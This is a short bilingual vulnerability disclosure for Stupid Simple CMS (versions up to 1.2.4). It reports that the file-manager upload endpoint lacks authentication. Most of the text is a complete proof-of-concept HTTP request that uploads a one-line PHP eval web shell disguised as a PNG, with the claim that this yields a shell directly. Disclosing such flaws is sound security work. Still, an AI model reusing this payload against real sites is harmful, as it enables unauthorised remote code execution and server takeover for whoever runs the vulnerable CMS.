product： Stupid Simple CMS ( Blogger )
download link： https://github.com/codelyfe/Stupid-Simple-CMS
version：<=1.2.4
POC:
```shell
POST http://127.0.0.1/file-manager/upload.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 218
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypgrUEkuaER8vFmOt
Origin: http://127.0.0.1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1/file-manager/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarypgrUEkuaER8vFmOt
Content-Disposition: form-data; name="file"; filename="shell2.php"
Content-Type: image/png

<?php eval(@$_POST['password1']);?>
------WebKitFormBoundarypgrUEkuaER8vFmOt--
```
You can getshell directly.  
Code audit found that the file upload interface has no authentication measures, which can lead to arbitrary file upload getshell.
可以直接getshell
代码审计发现文件上传接口无鉴权措施，可导致任意文件上传getshell
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312132216678.png)

 Local tests can be done by getshell:
 本地测试可以getshell：
 ![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312132306848.png)
 ![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312132217481.png)
